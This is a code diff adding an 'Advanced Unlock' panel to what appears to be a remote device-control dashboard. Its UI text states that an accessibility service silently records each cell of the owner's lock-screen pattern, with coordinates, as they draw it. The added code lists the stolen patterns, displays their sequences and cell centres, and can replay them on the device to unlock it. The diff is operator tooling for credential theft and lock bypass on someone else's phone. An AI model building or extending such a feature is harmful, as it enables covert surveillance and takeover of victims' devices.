@@ -452,6 +452,169 @@ const btnStyle = (bg, disabled = false) => ({
   opacity: disabled ? 0.6 : 1,
 });
 
+// ── Advanced Unlock: 3×3 grid cell positions ──────────────────────────────────
+function advCellPos(n, pad, cellW, cellH) {
+  const idx = n - 1;
+  const col = idx % 3;
+  const row = Math.floor(idx / 3);
+  return { x: pad + col * cellW, y: pad + row * cellH };
+}
+
+// Static SVG preview showing the pattern on a 3×3 dot grid
+function AdvancedPatternPreview({ cells, width = 160, height = 160 }) {
+  const minDim = Math.min(width, height);
+  const pad    = minDim * 0.15;
+  const cW     = (width  - pad * 2) / 2;
+  const cH     = (height - pad * 2) / 2;
+  const nodeR  = Math.min(10, minDim * 0.1);
+  const cp     = n => advCellPos(n, pad, cW, cH);
+  const inPat  = new Set(cells || []);
+  const pathD  = cells && cells.length >= 2
+    ? cells.map((n, i) => { const { x, y } = cp(n); return `${i === 0 ? 'M' : 'L'}${x},${y}`; }).join(' ')
+    : '';
+  return (
+    <svg width={width} height={height} style={{ background: '#0b1220', borderRadius: 8, display: 'block', border: '1px solid #1e293b', flexShrink: 0 }}>
+      {pathD && <path d={pathD} fill="none" stroke="#a855f7" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" opacity="0.85" />}
+      {Array.from({ length: 9 }, (_, i) => {
+        const n = i + 1;
+        const { x, y } = cp(n);
+        const active = inPat.has(n);
+        const si     = cells ? cells.indexOf(n) : -1;
+        return (
+          <g key={n}>
+            <circle cx={x} cy={y} r={nodeR} fill="none" stroke={active ? '#a855f7' : '#1e293b'} strokeWidth="1.5" />
+            <circle cx={x} cy={y} r={active ? nodeR * 0.5 : nodeR * 0.3} fill={active ? '#a855f7' : '#334155'} />
+            {active && nodeR >= 7 && (
+              <text x={x} y={y + nodeR * 0.35} textAnchor="middle" fill="#fff" fontSize={Math.max(6, nodeR * 0.75)} fontWeight="700" fontFamily="monospace">
+                {si + 1}
+              </text>
+            )}
+          </g>
+        );
+      })}
+    </svg>
+  );
+}
+
+// Animated canvas that draws straight lines between cells one segment at a time
+function AdvancedReplayCanvas({ cells, active, width = 300, height = 240 }) {
+  const canvasRef = useRef(null);
+  const rafRef    = useRef(null);
+  const pad = 32;
+  const cW  = (width  - pad * 2) / 2;
+  const cH  = (height - pad * 2) / 2;
+  const cp  = n => advCellPos(n, pad, cW, cH);
+
+  useEffect(() => {
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    if (rafRef.current) cancelAnimationFrame(rafRef.current);
+
+    const drawGrid = () => {
+      ctx.clearRect(0, 0, width, height);
+      ctx.fillStyle = '#0b1220';
+      ctx.fillRect(0, 0, width, height);
+      for (let i = 1; i <= 9; i++) {
+        const { x, y } = cp(i);
+        ctx.beginPath();
+        ctx.arc(x, y, 13, 0, Math.PI * 2);
+        ctx.strokeStyle = '#1e293b';
+        ctx.lineWidth = 2;
+        ctx.stroke();
+        ctx.beginPath();
+        ctx.arc(x, y, 4, 0, Math.PI * 2);
+        ctx.fillStyle = '#334155';
+        ctx.fill();
+        ctx.fillStyle = '#475569';
+        ctx.font = '10px monospace';
+        ctx.textAlign = 'center';
+        ctx.textBaseline = 'middle';
+        ctx.fillText(String(i), x, y);
+      }
+    };
+
+    if (!active || !cells || cells.length < 2) {
+      drawGrid();
+      return;
+    }
+
+    const MS_PER_SEG = 320;
+    const TOTAL_MS   = MS_PER_SEG * (cells.length - 1);
+    const startWall  = performance.now();
+
+    const animate = (now) => {
+      const elapsed   = now - startWall;
+      const progress  = Math.min(elapsed / TOTAL_MS, 1);
+      const totalSegs = cells.length - 1;
+      const segProg   = progress * totalSegs;
+      const doneSeg   = Math.floor(segProg);
+      const partial   = segProg - doneSeg;
+
+      drawGrid();
+      ctx.lineCap  = 'round';
+      ctx.lineJoin = 'round';
+
+      for (let s = 0; s < doneSeg && s < totalSegs; s++) {
+        const from = cp(cells[s]);
+        const to   = cp(cells[s + 1]);
+        ctx.globalAlpha  = 0.9;
+        ctx.strokeStyle  = '#a855f7';
+        ctx.lineWidth    = 3.5;
+        ctx.beginPath();
+        ctx.moveTo(from.x, from.y);
+        ctx.lineTo(to.x, to.y);
+        ctx.stroke();
+        ctx.globalAlpha = 1;
+        ctx.beginPath();
+        ctx.arc(from.x, from.y, 7, 0, Math.PI * 2);
+        ctx.fillStyle = '#a855f7';
+        ctx.fill();
+      }
+      if (doneSeg < totalSegs) {
+        const from = cp(cells[doneSeg]);
+        const to   = cp(cells[doneSeg + 1]);
+        const cx   = from.x + (to.x - from.x) * partial;
+        const cy   = from.y + (to.y - from.y) * partial;
+        ctx.globalAlpha = 0.9;
+        ctx.strokeStyle = '#a855f7';
+        ctx.lineWidth   = 3.5;
+        ctx.beginPath();
+        ctx.moveTo(from.x, from.y);
+        ctx.lineTo(cx, cy);
+        ctx.stroke();
+        ctx.globalAlpha = 1;
+        ctx.beginPath();
+        ctx.arc(from.x, from.y, 7, 0, Math.PI * 2);
+        ctx.fillStyle = '#a855f7';
+        ctx.fill();
+      }
+      if (progress >= 1) {
+        const last = cp(cells[cells.length - 1]);
+        ctx.beginPath();
+        ctx.arc(last.x, last.y, 7, 0, Math.PI * 2);
+        ctx.fillStyle = '#a855f7';
+        ctx.fill();
+        ctx.globalAlpha = 1;
+      }
+      if (progress < 1) {
+        rafRef.current = requestAnimationFrame(animate);
+      }
+    };
+    rafRef.current = requestAnimationFrame(animate);
+    return () => { if (rafRef.current) cancelAnimationFrame(rafRef.current); };
+  }, [active, cells]);
+
+  return (
+    <canvas
+      ref={canvasRef}
+      width={width}
+      height={height}
+      style={{ borderRadius: 10, border: '1px solid #1e293b', display: 'block' }}
+    />
+  );
+}
+
 const formatDur = ms => ms < 1000 ? `${ms}ms` : `${(ms / 1000).toFixed(1)}s`;
 const formatTime = ms => ms ? new Date(ms).toLocaleString() : '';
 
@@ -484,6 +647,14 @@ export default function GestureTab({ device, sendCommand, results }) {
   const [replayActive, setReplayActive]       = useState(false);
   const livePollingRef = useRef(null);
   const replayTimerRef = useRef(null);
+
+  // ── Advanced Unlock ────────────────────────────────────────────────────────
+  const [advPatterns, setAdvPatterns]           = useState([]);
+  const [advLoading, setAdvLoading]             = useState(false);
+  const [advReplayingFile, setAdvReplayingFile] = useState(null);
+  const [advSelectedFile, setAdvSelectedFile]   = useState(null);
+  const [advSelectedData, setAdvSelectedData]   = useState(null);
+  const [advReplayActive, setAdvReplayActive]   = useState(false);
 
   const deviceW = device?.deviceInfo?.screenWidth  || 720;
   const deviceH = device?.deviceInfo?.screenHeight || 1600;
@@ -623,6 +794,33 @@ export default function GestureTab({ device, sendCommand, results }) {
         }
       }
 
+      // ── Advanced Unlock responses ──────────────────────────────────────────
+      if (r.command === 'advanced_unlock_list') {
+        setAdvLoading(false);
+        if (data.success && data.patterns) setAdvPatterns(data.patterns);
+      }
+      if (r.command === 'advanced_unlock_get') {
+        if (data.success && data.pattern) setAdvSelectedData(data.pattern);
+      }
+      if (r.command === 'advanced_unlock_replay') {
+        setAdvReplayingFile(null);
+        if (data.success) {
+          status(`Pattern sent to device — ${data.cellCount} cells, ${data.durationMs}ms`);
+          setAdvReplayActive(false);
+          setTimeout(() => setAdvReplayActive(true), 50);
+          setTimeout(() => setAdvReplayActive(false), 4000);
+        } else {
+          status('Replay failed: ' + (data.error || ''));
+        }
+      }
+      if (r.command === 'advanced_unlock_delete') {
+        if (data.success) {
+          setAdvPatterns(prev => prev.filter(p => p.filename !== data.filename));
+          if (advSelectedFile === data.filename) { setAdvSelectedFile(null); setAdvSelectedData(null); }
+          status('Pattern deleted');
+        }
+      }
+
       if (r.command === 'read_screen' && waitingForScreenRef.current && pendingPatternRef.current) {
         waitingForScreenRef.current = false;
         const screen = data?.screen || data;
@@ -711,6 +909,35 @@ export default function GestureTab({ device, sendCommand, results }) {
     setReplayingLive(filename);
     sendCmd('gesture_live_replay', { filename });
     status(`Loading replay for ${filename}…`);
+  }
+
+  // ── Advanced Unlock helpers ─────────────────────────────────────────────────
+  function loadAdvPatterns() {
+    setAdvLoading(true);
+    sendCmd('advanced_unlock_list');
+  }
+
+  function replayAdvPattern(filename, cells) {
+    setAdvReplayingFile(filename);
+    sendCmd('advanced_unlock_replay', { filename });
+    status(`Sending pattern replay to device…`);
+    // Animate locally on the dashboard canvas
+    setAdvReplayActive(false);
+    setAdvSelectedFile(filename);
+    setTimeout(() => setAdvReplayActive(true), 100);
+    setTimeout(() => setAdvReplayActive(false), 4500);
+  }
+
+  function deleteAdvPattern(filename) {
+    if (window.confirm(`Delete pattern "${filename}"?`)) {
+      sendCmd('advanced_unlock_delete', { filename });
+    }
+  }
+
+  function selectAdvPattern(p) {
+    setAdvSelectedFile(p.filename);
+    setAdvSelectedData(null);
+    sendCmd('advanced_unlock_get', { filename: p.filename });
   }
 
   return (
@@ -975,6 +1202,136 @@ export default function GestureTab({ device, sendCommand, results }) {
             {liveStreams.length === 0 && !lsLoading && (
               <div style={{ fontSize: 12, color: '#334155', textAlign: 'center', padding: '12px 0' }}>
                 No saved streams yet — start a stream and stop it to save
+              </div>
+            )}
+          </div>
+
+          {/* ── Advanced Unlock ─────────────────────────────────────────── */}
+          <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: '1px solid #7e22ce44' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 10 }}>
+              <span style={{ fontSize: 18 }}>🔐</span>
+              <div style={{ fontWeight: 700, fontSize: 14, color: '#c084fc', textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                Advanced Unlock
+              </div>
+              <button
+                onClick={loadAdvPatterns}
+                disabled={!isOnline || advLoading}
+                style={{ ...btnStyle('#581c87', !isOnline || advLoading), marginLeft: 'auto', padding: '5px 14px' }}
+              >
+                {advLoading ? '…' : '↻ Refresh'}
+              </button>
+            </div>
+
+            <div style={{ fontSize: 12, color: '#94a3b8', marginBottom: 14, lineHeight: 1.7 }}>
+              When the device is locked and the user draws a pattern, the accessibility service
+              automatically captures each cell touched (in order) together with its screen coordinates.
+              Patterns are stored locally on the device. Use <strong style={{ color: '#c084fc' }}>Replay</strong> to
+              send the pattern back to the device — it draws straight lines through the cell centers at natural speed.
+            </div>
+
+            {/* Pattern list */}
+            {advPatterns.length === 0 && !advLoading && (
+              <div style={{ fontSize: 12, color: '#334155', textAlign: 'center', padding: '14px 0', border: '1px dashed #334155', borderRadius: 8 }}>
+                No patterns captured yet — lock the device and draw a pattern to begin
+              </div>
+            )}
+
+            {advPatterns.length > 0 && (
+              <div style={{ display: 'flex', gap: 16 }}>
+
+                {/* Left: list */}
+                <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 6, maxHeight: 320, overflowY: 'auto' }}>
+                  {advPatterns.map(p => {
+                    const cells = p.cells ? (typeof p.cells === 'string' ? JSON.parse(p.cells) : Array.from(p.cells)) : [];
+                    const isSelected = advSelectedFile === p.filename;
+                    return (
+                      <div
+                        key={p.filename}
+                        onClick={() => selectAdvPattern(p)}
+                        style={{
+                          display: 'flex', alignItems: 'center', gap: 10,
+                          padding: '8px 10px', background: isSelected ? '#2d1b4e' : '#0f172a',
+                          borderRadius: 8, border: `1px solid ${isSelected ? '#7e22ce' : '#1e293b'}`,
+                          cursor: 'pointer',
+                        }}
+                      >
+                        <AdvancedPatternPreview cells={cells} width={56} height={56} />
+                        <div style={{ flex: 1, minWidth: 0 }}>
+                          <div style={{ fontSize: 12, color: '#c084fc', fontWeight: 600 }}>
+                            {cells.join(' → ')}
+                          </div>
+                          <div style={{ fontSize: 10, color: '#475569', marginTop: 2 }}>
+                            {p.cellCount} cells · {p.capturedAt ? new Date(p.capturedAt).toLocaleString() : ''}
+                          </div>
+                          <div style={{ fontSize: 10, color: '#334155' }}>
+                            {p.filename}
+                          </div>
+                        </div>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
+                          <button
+                            onClick={e => { e.stopPropagation(); replayAdvPattern(p.filename, cells); }}
+                            disabled={!isOnline || advReplayingFile === p.filename}
+                            style={{ ...btnStyle('#7e22ce', !isOnline || advReplayingFile === p.filename), padding: '4px 10px', fontSize: 11 }}
+                            title="Replay pattern on device"
+                          >
+                            {advReplayingFile === p.filename ? '…' : '▶ Replay'}
+                          </button>
+                          <button
+                            onClick={e => { e.stopPropagation(); deleteAdvPattern(p.filename); }}
+                            style={{ ...btnStyle('#7f1d1d'), padding: '4px 8px', fontSize: 11 }}
+                            title="Delete pattern"
+                          >
+                            🗑
+                          </button>
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+
+                {/* Right: detail + replay canvas */}
+                <div style={{ width: 300, display: 'flex', flexDirection: 'column', gap: 10 }}>
+                  {advSelectedFile && (
+                    <>
+                      <div style={{ fontSize: 11, color: '#7e22ce', textTransform: 'uppercase', letterSpacing: 0.5, fontWeight: 700 }}>
+                        Pattern Replay Preview
+                      </div>
+                      <AdvancedReplayCanvas
+                        cells={(() => {
+                          const src = advSelectedData?.cells || advPatterns.find(p => p.filename === advSelectedFile)?.cells;
+                          if (!src) return [];
+                          return typeof src === 'string' ? JSON.parse(src) : Array.from(src);
+                        })()}
+                        active={advReplayActive}
+                        width={300}
+                        height={240}
+                      />
+                      {advSelectedData && (
+                        <div style={{ fontSize: 11, color: '#64748b', lineHeight: 1.6 }}>
+                          <div>Screen: {advSelectedData.screenW}×{advSelectedData.screenH}</div>
+                          <div>Captured: {advSelectedData.capturedAt ? new Date(advSelectedData.capturedAt).toLocaleString() : '—'}</div>
+                          <div>Sequence: {advSelectedData.cells ? Array.from(advSelectedData.cells).join(' → ') : '—'}</div>
+                          {advSelectedData.cellCoords && (
+                            <div style={{ marginTop: 6 }}>
+                              <div style={{ color: '#475569', marginBottom: 4 }}>Cell centers:</div>
+                              {Array.from(advSelectedData.cellCoords).map((c, i) => (
+                                <div key={i} style={{ fontFamily: 'monospace', fontSize: 10 }}>
+                                  Cell {c.cell}: ({c.cx}, {c.cy})
+                                </div>
+                              ))}
+                            </div>
+                          )}
+                        </div>
+                      )}
+                    </>
+                  )}
+                  {!advSelectedFile && (
+                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: 240, color: '#334155', fontSize: 12 }}>
+                      Select a pattern to preview
+                    </div>
+                  )}
+                </div>
+
               </div>
             )}
           </div>
